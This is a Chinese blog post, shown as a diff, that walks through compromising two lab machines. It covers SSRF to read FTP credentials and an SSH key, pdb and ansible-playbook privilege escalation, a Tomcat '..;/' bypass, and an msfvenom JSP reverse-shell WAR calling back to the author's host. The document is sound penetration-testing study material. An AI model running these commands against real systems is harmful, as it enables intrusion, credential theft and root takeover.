@@ -1,0 +1,642 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="永安寺">
+  <meta name="keywords" content="">
+  
+  <title>迷糊的提权方式以及利用ssrf到最终提权靶机 - Victory</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="迷糊的提权方式以及利用ssrf到最终提权靶机">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      永安寺
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-01-22 22:14" pubdate>
+        2022年1月22日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      23
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">迷糊的提权方式以及利用ssrf到最终提权靶机</h1>
+            
+            <div class="markdown-body">
+              <p>目标是国外靶场</p>
+<p>打过才知道 学的知识太少了<br>师傅们看看就行 大家都会 要是描述得不对的地方 求指点</p>
+<p>本地环境： kali</p>
+<h2 id="首先是通过ssrf拿下的靶机"><a href="#首先是通过ssrf拿下的靶机" class="headerlink" title="首先是通过ssrf拿下的靶机"></a>首先是通过ssrf拿下的靶机</h2><h3 id="第一台"><a href="#第一台" class="headerlink" title="第一台"></a>第一台</h3><p>因为是连了vpn的所以可以直接扫<br>目标ip:10.10.11.111<br>拿到目标 只有ip 那就先扫端口<br>nmap -v -sSV -Pn 10.10.11.111 -T4 -sC</p>
+<p><img src="https://api2.mubu.com/v3/document_image/2b5874b4-2ba6-4837-9478-39f0e6b45dcb-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>没啥信息 只有80端口 那就打开web看看<br>直接访问10.10.11.111</p>
+<p><img src="https://api2.mubu.com/v3/document_image/ee2d18b0-381b-490c-83db-d7ea3e6b632f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>直接访问不了 添加host头</p>
+<blockquote>
+<p>echo “10.10.11.111 forge.xxx” &gt;&gt; /etc/hosts</p>
+</blockquote>
+<p>然后在次访问</p>
+<p><img src="https://api2.mubu.com/v3/document_image/8a469e49-e676-4f34-a553-4cd96f55a114-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>能访问了 发现有个上传的地方</p>
+<p><img src="https://api2.mubu.com/v3/document_image/9e2e0b4d-8c9b-4735-99d8-822e3069ca14-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://api2.mubu.com/v3/document_image/1324a8c9-b539-4751-8516-f5cbec32c248-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>上传试试</p>
+<p><img src="https://api2.mubu.com/v3/document_image/0c02f059-7fb8-4ee0-ac44-6e003c04b47e-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>发现重命名的后缀名 不解析 上传应该是没办法了 找找其他突破<br>先扫扫目录 和子域名<br>目录：gobuster dir -u <a target="_blank" rel="noopener" href="http://forge.xxx/">http://forge.xxx/</a> -w /usr/share/wordlists/dirb/common.txt</p>
+<p><img src="https://api2.mubu.com/v3/document_image/8abd3da4-213b-4c5e-bced-47f6fd4530e7-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>子域名：wfuzz -c -u “<a target="_blank" rel="noopener" href="http://forge.xxx/%E2%80%9C">http://forge.xxx/“</a> -H “Host:FUZZ.forge.xxx” -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt</p>
+<p><img src="https://api2.mubu.com/v3/document_image/6ac0b404-4b0a-4d6a-b364-5d75f7cf9c27-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>目录没扫出什么 扫到一个子域名 先进入看看<br>还是不能直接访问 先加入到host<br>echo “10.10.11.111 admin.forge.xxx” &gt;&gt; /etc/hosts</p>
+<p>提示只能本地访问</p>
+<p><img src="https://api2.mubu.com/v3/document_image/ffea800f-0a56-4aab-b623-50e1c1cf11f5-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>尝试加上X-Forwarded-For:127.0.0.1绕过失败。<br>但是前面那个上传的地方 还有一个上传路径的地方</p>
+<p><img src="https://api2.mubu.com/v3/document_image/cf31cc76-7910-4191-8c57-db59fc63f362-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>但是直接上传会提示是黑名单地址</p>
+<p><img src="https://api2.mubu.com/v3/document_image/eb5bfd91-dad0-4c72-99f7-b0db6c0f6e67-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>既然是黑名单 我们尝试绕过</p>
+<p><img src="https://api2.mubu.com/v3/document_image/885d1a99-41a9-49a4-965a-c23b90bb93c3-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>大小写绕过了：<a target="_blank" rel="noopener" href="http://admin.forge.xxx/">http://aDmin.forGe.xxx/</a><br>然后访问页面发现报错</p>
+<p><img src="https://api2.mubu.com/v3/document_image/cc8d5c0c-3905-4ed6-81dd-d9e4faa2fa5c-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后通过抓返回包发现一个路径</p>
+<p><img src="https://api2.mubu.com/v3/document_image/96964398-0f2e-4b71-815d-c457ae317e58-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后继续通过ssrf访问这个路径 继续进行抓包<br><a target="_blank" rel="noopener" href="http://admin.forge.xxx/announcements">http://aDmin.forGe.xxx/announcements</a><br><img src="https://api2.mubu.com/v3/document_image/cb0a69bb-5fc7-4748-9206-7e7b3a5a4b94-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后访问路径抓取返回包 获得了ftp的密码</p>
+<p><img src="https://api2.mubu.com/v3/document_image/e98fa15f-7dba-400f-bf54-6d1de195d0d4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>user:heightofsecurity123!<br>以及获取/upload目录API用法，u=url<br><a target="_blank" rel="noopener" href="http://admin.forge.xxx/upload?u=url">http://aDmin.forGe.xxx/upload?u=url</a></p>
+<p>然后结合起来读取ftp<br><a href="ftp://user:heightofsecurity123!@forge.xxx/">ftp://user:heightofsecurity123!@FORGE.xxx</a></p>
+<p><a target="_blank" rel="noopener" href="http://admin.forge.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx">http://aDmin.forGe.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx</a></p>
+<p><img src="https://api2.mubu.com/v3/document_image/e59b5cd8-5203-4496-9c4d-52a71316dcc6-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后继续bp抓返回包</p>
+<p><img src="https://api2.mubu.com/v3/document_image/b4e7e9b6-1789-48d9-84d9-ff990d6d45df-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>可以成功访问到，也就是说我们现在可以利用ssrf读取系统文件了。user.txt在这就说明现在已经是用户家目录了。读取ssh私钥<br><a target="_blank" rel="noopener" href="http://admin.forge.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx/.ssh/id_rsa">http://aDmin.forGe.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx/.ssh/id_rsa</a></p>
+<p><img src="https://api2.mubu.com/v3/document_image/7a353a44-6dbf-4ab2-9d60-7820be498f40-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>用同样的方法读取</p>
+<p><img src="https://api2.mubu.com/v3/document_image/52dc38f3-2583-4785-a14d-ac41ac21dac0-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后保存id_rsa</p>
+<p><img src="https://api2.mubu.com/v3/document_image/dd110bb3-b516-4122-be51-c8e95d166f24-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后ssh连接<br>ssh -i id_rsa <a href="mailto:&#117;&#115;&#x65;&#x72;&#x40;&#49;&#x30;&#46;&#49;&#48;&#x2e;&#x31;&#x31;&#46;&#49;&#x31;&#49;">&#117;&#115;&#x65;&#x72;&#x40;&#49;&#x30;&#46;&#49;&#48;&#x2e;&#x31;&#x31;&#46;&#49;&#x31;&#49;</a></p>
+<p><img src="https://api2.mubu.com/v3/document_image/e0239698-ac25-4bcb-bb76-3745f2e062fd-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>成功连接上来</p>
+<p><img src="https://api2.mubu.com/v3/document_image/d5081e0d-31ce-458f-b77c-4069fe199bb1-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>sudo -l 发现一个不需要密码执行的py文件</p>
+<p><img src="https://api2.mubu.com/v3/document_image/b4eccb9a-0e65-4cfa-a239-8eec714f7bd7-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后看下这个文件</p>
+<p><img src="https://api2.mubu.com/v3/document_image/2a6e2c39-8f05-4428-83b0-683b9ea512ec-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>发现是建立socket链接 监听40433端口 那就先执行这个py文件看看<br>先执行py文件看看 然后在用nc连接</p>
+<p><img src="https://api2.mubu.com/v3/document_image/047fd3c2-59e0-42ac-aa46-115113aa4369-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后在随便输入的时候 发现会调用pdb调试<br>pdb模式下是可以执行python代码的。于是直接给bash加上suid提权</p>
+<p><img src="https://api2.mubu.com/v3/document_image/b04c26bc-5721-4488-b661-e41da97d8924-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>pdb：pdb是The Python Debugger的缩写，为Python标准库的一个模块。该模块规定了一个Python程序交互式源代码调试器，支持设置断点，也支持源码级单步调试，栈帧监视，源代码列出，任意栈帧上下文的随机Python代码估值。</p>
+<p>到此 这一台也就提权完毕</p>
+<h2 id="第二台-利用ansible-playbook提权"><a href="#第二台-利用ansible-playbook提权" class="headerlink" title="第二台 利用ansible-playbook提权"></a>第二台 利用ansible-playbook提权</h2><h3 id="第二台"><a href="#第二台" class="headerlink" title="第二台"></a>第二台</h3><p>目标ip：10.10.10.250<br>拿到目标还是先扫描端口 进行信息收集</p>
+<p><img src="https://api2.mubu.com/v3/document_image/04863ac9-d9cf-4e95-9f86-37a659f6fc3a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>命令：nmap -v -sSV -Pn 10.10.10.250 -T4 -sC<br>发现开了22 443 8080<br>直接先打开8080端口看看</p>
+<p><img src="https://api2.mubu.com/v3/document_image/9b96a63d-20fd-48bc-b21b-88a9d6ae2eaf-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>发现是一个登陆框 cms是 gitbucket<br>试了下弱口令 发现不存在 那就注册一个</p>
+<p><img src="https://api2.mubu.com/v3/document_image/cc915f01-a5b7-4fe5-bb1e-e6ff8a4f3810-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>注册之后然后登录</p>
+<p><img src="https://api2.mubu.com/v3/document_image/e5fd9cbb-c76a-4750-8905-18ca6de415a5-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这应该是一个代码仓库</p>
+<p><img src="https://api2.mubu.com/v3/document_image/b1cf2539-d293-4977-b65a-e2af9f552308-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>因为前面还有443端口开发 打开443端口看看</p>
+<p><img src="https://api2.mubu.com/v3/document_image/4ca86c5a-fa40-478d-83aa-93a661b32811-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>之前nmap扫描出443端口，但是无法访问https，写入hosts尝试登录<br>添加到host 因为扫描出有一个seal.xxx</p>
+<p><img src="https://api2.mubu.com/v3/document_image/42436620-2122-4193-a930-1c59b43155bb-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>echo 10.10.10.250 seal.xxx &gt;&gt; /etc/hosts<br>是一个商城 那8080 的的确是443的代码库</p>
+<p>然后继续翻代码库 通过找最近commits 在tomcat里面翻到了账户密码</p>
+<p><img src="https://api2.mubu.com/v3/document_image/90292c81-1956-4b24-9004-260ad74dd51c-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://api2.mubu.com/v3/document_image/0f9dde11-d568-4fed-8f24-8e40b3432a7b-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><a target="_blank" rel="noopener" href="http://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7">http://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7</a><br>username = tomcat<br>password = 42MrHBf*z8{Z%<br>尝试访问tomcat默认登录目录<br>/manager/status<br><a target="_blank" rel="noopener" href="https://seal.xxx/manager/status">https://seal.xxx/manager/status</a></p>
+<p><img src="https://api2.mubu.com/v3/document_image/20e57c4c-dd26-49ec-9322-6e48e5abff76-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>输入找到的账户密码 成功登录</p>
+<p><img src="https://api2.mubu.com/v3/document_image/9316b83e-640b-4af3-9415-8dce6b933752-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>因为前面根据nmap 扫描出tomcat是通过反代的 这样会存在一个问题<br>这个问题这里参考<a target="_blank" rel="noopener" href="https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/">https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/</a><br>管理界面/manager/html无法访问显示权限不够</p>
+<p><img src="https://api2.mubu.com/v3/document_image/ac5a0704-181a-414c-bec9-d8088c3b9a62-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这里就可以利用tomcat 和反代的漏洞 用..;/绕过</p>
+<p><img src="https://api2.mubu.com/v3/document_image/b137a294-867b-4ad5-8814-1215184059b9-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><a target="_blank" rel="noopener" href="https://seal.xxx/manager/status/..;/html">https://seal.xxx/manager/status/..;/html</a><br>然后这里有一个上传的地方</p>
+<p><img src="https://api2.mubu.com/v3/document_image/8984b9f6-0f75-461f-8ece-dfdb6e35dd9f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后打包一个war包的shell上传<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.46 LPORT=6666 -f war -o shell.war</p>
+<p>在上传之前，请记住一件事。这里存在路径遍历漏洞。所以，你不能直接上传.war文件。唯一的过程是在上传之前修改路径，因此我在Burpsuite中拦截了上传请求以进一步修改。</p>
+<p><img src="https://api2.mubu.com/v3/document_image/fc183b54-5bdf-46b7-8836-7edbcdb223b3-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://api2.mubu.com/v3/document_image/245e4a1f-cd4b-444d-947e-ff5be5541a24-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>上传之后 开启监听 然后访问 <a target="_blank" rel="noopener" href="https://seal.xxx/shell/">https://seal.xxx/shell/</a><br>nc -lvvp 6666</p>
+<p><img src="https://api2.mubu.com/v3/document_image/8bb4c0fd-cba3-49a0-89a0-3c421b25b1d6-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://api2.mubu.com/v3/document_image/4edd03c1-2702-41f3-b1c3-0930cca2f994-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>发现还有个luis 这个开始在8080端口里面也发现了</p>
+<p><img src="https://api2.mubu.com/v3/document_image/ea6fe118-2f0c-4de3-86bf-fffade801216-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后在lusi目录下发现user.txt</p>
+<p><img src="https://api2.mubu.com/v3/document_image/ccd92432-2616-4860-ae41-ec1a2f86140a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>命令：find / -name user.txt<br>但是查看user.txt的时候发现没有权限</p>
+<p><img src="https://api2.mubu.com/v3/document_image/6776569f-1c51-449a-8886-b0fad61c3ab4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>需要提权了</p>
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>在查看进程的时候发现了一个有趣的进程</p>
+<p><img src="https://api2.mubu.com/v3/document_image/f0d1e071-ce7b-498b-9bc7-dbf390a2dcab-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>命令：ps aux | grep root<br>然后我们看看run.yml文件</p>
+<p><img src="https://api2.mubu.com/v3/document_image/7f9029bc-e2bd-4019-944d-15cd810a70ba-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>发现tomcat只有读的权限<br>cat /opt/backups/playbook/run.yml</p>
+<p><img src="https://api2.mubu.com/v3/document_image/d5ee7b01-c400-4a1e-9841-ec40682e9c66-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>第 4 行至关重要。看起来这里脚本copy_links=yes在src和dest文件之间建立了符号链接（As ）。然后在第 8 行，它/opt/backups/archives以 gzip 格式备份文件。检查/var/lib/tomcat9/webapps/ROOT/admin/dashboard目录，</p>
+<p><img src="https://api2.mubu.com/v3/document_image/4d45d27f-798d-400e-9986-229ddae797eb-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>发现只有uploads目录可写<br>网上了解搜索一下ansible playbook：<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_9019400/2385520">https://blog.51cto.com/u_9019400/2385520</a><br>这个yml是在做文件备份<br>所以创建一个指向luis的id_rsa的软链接文件，我们可以把它放到/uploads目录中<br>命令：ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa<br>然后可以在/opt/backups/archives下看到gz文件 然后解压</p>
+<p><img src="https://api2.mubu.com/v3/document_image/b07fff18-584f-4832-9536-f574187a182d-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后将压缩文件复制到tmp目录下</p>
+<p><img src="https://api2.mubu.com/v3/document_image/6c79b3c5-0b49-46bc-863b-f69cb3f7a51f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后解压</p>
+<p><img src="https://api2.mubu.com/v3/document_image/b7273e7e-f623-4846-940f-7837c4a8343f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>命令：tar -xvf t.tar.gz<br>切换到uploads目录然后查看id_rsa</p>
+<p><img src="https://api2.mubu.com/v3/document_image/b4ad96ff-504b-4f06-aa07-2ed63af10c70-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>保存到本地<br>然后ssh 连接 但是在连接之前 需要给chmod 600</p>
+<p><img src="https://api2.mubu.com/v3/document_image/b6c2b9bb-ea27-48a0-8785-42b108d07bd4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://api2.mubu.com/v3/document_image/b6b37585-cf9f-4f9f-81de-ebe7eed1883b-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后成功查看user.txt<br>cat user.txt</p>
+<p><img src="https://api2.mubu.com/v3/document_image/a6d81b90-6565-4458-83b0-e82fead6d365-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h3 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h3><h4 id="第一种提权"><a href="#第一种提权" class="headerlink" title="第一种提权"></a>第一种提权</h4><p>sudo -l</p>
+<p><img src="https://api2.mubu.com/v3/document_image/f957f7a8-8146-4d56-b456-764a8b29e640-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>发现luis不用密码就可以以root 执行ansible-playebook<br>直接在提权网址发现一个提权方式</p>
+<p><img src="https://api2.mubu.com/v3/document_image/0d3bbb89-734b-48b7-a116-560d99c76d46-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>命令：<br>TF=$(mktemp)<br>echo ‘[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]‘ &gt;$TF<br>sudo ansible-playbook $TF</p>
+<p>这样提权太快了<br>提权网址：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/#">https://gtfobins.github.io/#</a></p>
+<h4 id="第二种提权："><a href="#第二种提权：" class="headerlink" title="第二种提权："></a>第二种提权：</h4><p>创建一个root.yml文件</p>
+<p><img src="https://api2.mubu.com/v3/document_image/131e07c9-d29f-451e-88a7-f313652ecf64-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后：sudo /usr/bin/ansible-playbook root.yml</p>
+<p><img src="https://api2.mubu.com/v3/document_image/78c8a8b9-bcf1-4bfd-8a83-57e9b5040a71-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h4 id="第三种则是直接复制root-txt-也是创建yml文件"><a href="#第三种则是直接复制root-txt-也是创建yml文件" class="headerlink" title="第三种则是直接复制root.txt 也是创建yml文件"></a>第三种则是直接复制root.txt 也是创建yml文件</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">name:</span> Ansible Copy Example Local to Remote<br><span class="hljs-symbol">hosts:</span> localhost<br><span class="hljs-symbol">tasks:</span><br><span class="hljs-symbol">    name:</span> copying file with playbook<br><span class="hljs-symbol">    become:</span> true<br><span class="hljs-symbol">    copy:</span><br><span class="hljs-symbol">    src:</span> <span class="hljs-meta-keyword">/root/</span>root.txt<br><span class="hljs-symbol">    dest:</span> <span class="hljs-meta-keyword">/dev/</span>shm<br><span class="hljs-symbol">    owner:</span> luis<br><span class="hljs-symbol">    group:</span> luis<br><span class="hljs-symbol">    mode:</span> <span class="hljs-number">0777</span><br></code></pre></td></tr></table></figure>
+
+<p>使用sudo /usr/bin/ansible-playbook执行root.yml文件<br>然后在dev/shm下找到root.txt</p>
+<p><img src="https://api2.mubu.com/v3/document_image/3c9eb4c1-9696-4843-a169-b90ae0efeebe-11763069.jpg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这两个靶机 还是学到了不少 ssrf的利用 通过返回包看见a标签里面有一个路径 然后ssrf读取 发现密钥 到最后通过 pdb提权<br>以及tomcat的..;绕过的方式 然后上传war 拿下shell 以及后面的利用ansible-playbook提权<br>最后 还是知识面不够阿<br>有什么不足 写得不对的地方 求师傅们指点</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/01/22/%E8%BF%B7%E7%B3%8A%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8ssrf%E5%88%B0%E6%9C%80%E7%BB%88%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA-1/">
